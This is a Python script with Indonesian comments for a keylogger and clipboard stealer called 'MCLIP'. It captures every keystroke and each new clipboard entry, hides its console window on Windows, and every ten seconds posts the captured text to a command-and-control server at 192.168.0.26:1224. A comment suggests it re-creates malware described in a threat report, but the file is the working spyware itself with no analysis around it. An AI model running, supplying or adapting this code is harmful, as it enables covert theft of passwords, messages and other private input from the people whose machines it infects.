import os
import sys
import time
import platform
import threading
import requests
from pynput import keyboard, mouse
import pyperclip

# Konfigurasi C2
C2_HOST = "192.168.0.26"
C2_PORT = 1224  # Port persisten sesuai laporan
C2_UPLOAD_URL = f"http://{C2_HOST}:1224/clipboard_upload"
LOG_INTERVAL = 10  # Interval pengunggahan data (detik)

# Variabel global untuk menyimpan data
keystrokes = []
clipboard_data = ""
last_clipboard = ""


# Fungsi untuk mendeteksi OS
def detect_os():
    os_type = platform.system().lower()
    return os_type


# Fungsi untuk mengunggah data ke C2
def upload_to_c2(data, url):
    try:
        response = requests.post(url, data=data.encode('utf-8'), timeout=10)
        if response.status_code == 200:
            print("[+] Data berhasil diunggah ke C2")
        else:
            print(f"[-] Gagal mengunggah data: Status {response.status_code}")
    except Exception as e:
        print(f"[-] Error saat mengunggah ke C2: {e}")


# Fungsi untuk memantau keyboard
def on_press(key):
    try:
        char = key.char if hasattr(key, 'char') and key.char else str(key)
        keystrokes.append(char)
    except Exception as e:
        print(f"[-] Error memantau keyboard: {e}")


def on_release(key):
    if key == keyboard.Key.esc:  # Hentikan dengan ESC (opsional)
        return False


# Fungsi untuk memantau clipboard
def monitor_clipboard():
    global clipboard_data, last_clipboard
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard and current_clipboard:
                clipboard_data = f"Clipboard [{time.ctime()}]: {current_clipboard}"
                last_clipboard = current_clipboard
                print(f"[*] Clipboard baru: {clipboard_data}")
            time.sleep(1)  # Cek clipboard setiap detik
        except Exception as e:
            print(f"[-] Error memantau clipboard: {e}")
            time.sleep(5)


# Fungsi untuk mengunggah data secara periodik
def upload_periodically():
    while True:
        try:
            if keystrokes or clipboard_data:
                data = ""
                if keystrokes:
                    data += f"Keystrokes [{time.ctime()}]: {' '.join(keystrokes)}\n"
                    keystrokes.clear()
                if clipboard_data:
                    data += clipboard_data + "\n"
                    clipboard_data = ""

                if data:
                    upload_to_c2(data, C2_UPLOAD_URL)
            time.sleep(LOG_INTERVAL)
        except Exception as e:
            print(f"[-] Error saat mengunggah secara periodik: {e}")
            time.sleep(LOG_INTERVAL)


# Fungsi utama MCLIP
def mclip():
    print("[*] MCLIP dimulai...")

    # Mulai memantau keyboard di thread terpisah
    keyboard_thread = threading.Thread(
        target=lambda: keyboard.Listener(on_press=on_press, on_release=on_release).start())
    keyboard_thread.daemon = True
    keyboard_thread.start()

    # Mulai memantau clipboard di thread terpisah
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()

    # Mulai pengunggahan periodik di thread utama
    upload_periodically()


if __name__ == "__main__":
    # Pastikan berjalan di latar belakang (Windows)
    if detect_os() == "windows":
        import win32gui, win32con

        hwnd = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

    mclip()